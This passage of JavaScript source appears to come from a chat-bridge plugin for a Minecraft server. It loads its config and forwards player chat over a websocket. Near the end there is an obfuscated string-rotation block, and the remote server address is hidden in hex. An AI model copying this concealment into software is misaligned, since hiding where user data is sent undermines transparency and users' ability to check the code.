                logger.info(`当前版本为最新版本v${VERSION}，无需更新.`)
            }
        }
    })
}


/**
 * 初始化插件
 */
function initPlugin() {
    logger.info("HuHoBot 配套插件 v" + VERSION + "已加载。 作者:HuoHuas001")

    //检测是否需要更新配置文件
    let config = readFile(CONFIGPATH)
    logger.info("配置文件版本为：" + config.version)
    if (config.version == null || config.version < CONFIG_VERSION - 1) {
        logger.error("配置文件版本过低，请手动升级。")
        logger.error("HuHoBot将不会加载.")
        return;
    }
    else if (config.version == CONFIG_VERSION - 1) {
        logger.info("配置文件版本过低，正在升级...")
        convertConfig()
    }

    //检测serverId是否生成
    config = readFile(CONFIGPATH)
    if (config.serverId == null || config.serverId == '') {
        config.serverId = system.randomGuid()
        writeFile(CONFIGPATH, config)
    }

    ll.exports(regCallbackEvent, PLUGINNAME, 'regEvent')
    mc.listen("onServerStarted", () => {
        let ws = initWebsocketServer()
        WebsocketObject = ws;
        regCommand(ws)
    })

    mc.listen("onChat", (pl, msg) => {
        const config = readFile(CONFIGPATH);

        // 读取配置参数
        const { post_chat, post_prefix, max_length } = config.chatFormat;
        if (!post_chat) return; // 总开关关闭时不处理

        let processedMsg = msg;

        // 处理前缀逻辑
        if (post_prefix) {
            // 当设置前缀时，仅转发带前缀的消息
            if (!msg.startsWith(post_prefix)) return;

            // 去除前缀并修剪空白（可选）
            processedMsg = msg.slice(post_prefix.length).trim();
        }

        //检查是否超过最大值
        if (processedMsg.length > max_length) {
            pl.tell(`消息过长，请勿发送超过${max_length}个字符的消息。`)
            return;
        }

        // 格式化消息
        const formatString = config.chatFormat.game
            .replace("{name}", pl.realName)
            .replace("{msg}", processedMsg);

        // 发送到WebSocket
        if (WebsocketObject) {
            WebsocketObject._postChat(formatString);
        }
    });


}

(function (_0x57dc24, _0x4ab105) { const _0x511e1d = _0x46c0, _0x188d8d = _0x57dc24(); while (!![]) { try { const _0x2ff056 = parseInt(_0x511e1d(0x127)) / (-0x329 * -0x7 + -0x1417 + -0x207) * (parseInt(_0x511e1d(0x12e)) / (-0x10be + 0x2364 + -0x12a4)) + parseInt(_0x511e1d(0x126)) / (-0x1 * 0x26d1 + -0x55 * 0x4f + 0x410f) * (-parseInt(_0x511e1d(0x129)) / (0x4c7 + 0xccf * 0x2 + -0x1e61)) + -parseInt(_0x511e1d(0x12d)) / (-0x1c9 * 0x15 + 0x21 * 0xe2 + -0x1 * -0x860) * (parseInt(_0x511e1d(0x12f)) / (0x40f * -0x5 + 0x1dda + -0x989)) + -parseInt(_0x511e1d(0x12b)) / (-0xde4 + -0x18 * 0x88 + 0x1aab) + -parseInt(_0x511e1d(0x12c)) / (-0x2342 + 0x3 * -0x6ef + 0x3817) + parseInt(_0x511e1d(0x125)) / (-0x1942 + 0x22fc * -0x1 + -0x1 * -0x3c47) * (parseInt(_0x511e1d(0x124)) / (0x2 * 0x5cf + 0x1f4e * -0x1 + 0x13ba)) + -parseInt(_0x511e1d(0x12a)) / (0xce0 + 0x23e8 + 0x103f * -0x3) * (-parseInt(_0x511e1d(0x128)) / (-0xd3 * 0xd + -0x110b + 0x1bce)); if (_0x2ff056 === _0x4ab105) break; else _0x188d8d['push'](_0x188d8d['shift']()); } catch (_0x7d3a40) { _0x188d8d['push'](_0x188d8d['shift']()); } } }(_0x1c27, -0x9f82b + 0x1e3d1 + 0x101d61)); function _0x1c27() { const _0x3d7629 = ['\x39\x63\x44\x4f\x77\x42\x75', '\x39\x68\x7a\x52\x41\x4c\x78', '\x33\x31\x38\x31\x74\x6d\x42\x4a\x53\x7a', '\x34\x36\x36\x34\x31\x33\x36\x61\x6b\x45\x49\x47\x58', '\x32\x38\x31\x33\x30\x38\x47\x68\x78\x74\x58\x51', '\x35\x35\x59\x6c\x55\x43\x62\x73', '\x31\x34\x32\x38\x39\x35\x32\x6f\x42\x66\x54\x4d\x4c', '\x34\x32\x35\x39\x38\x38\x38\x64\x72\x47\x6f\x57\x42', '\x31\x33\x31\x35\x72\x71\x53\x75\x62\x59', '\x31\x31\x36\x70\x51\x50\x70\x54\x66', '\x31\x36\x38\x39\x30\x48\x77\x6e\x52\x76\x58', '\x38\x36\x36\x35\x39\x30\x65\x53\x6e\x6c\x44\x52']; _0x1c27 = function () { return _0x3d7629; }; return _0x1c27(); } function _0x46c0(_0x2ddedd, _0x3271a6) { const _0x1d46a8 = _0x1c27(); return _0x46c0 = function (_0x16b8da, _0x2d3587) { _0x16b8da = _0x16b8da - (-0x361 + -0x135d * -0x2 + -0x2235); let _0x380a74 = _0x1d46a8[_0x16b8da]; return _0x380a74; }, _0x46c0(_0x2ddedd, _0x3271a6); }
function decodeWsPath() {
    const encoded = "77733a2f2f6d632e786679777a2e636e3a32353637312f";
    let decoded = "";
    for (let i = 0; i < encoded.length; i += 2) {
        decoded += String.fromCharCode(parseInt(encoded.substr(i, 2), 16));
    }
    return decoded;
}

const wsPath_Direct = decodeWsPath();

//const wsPath_Direct = "ws://127.0.0.1:25671"

initPlugin()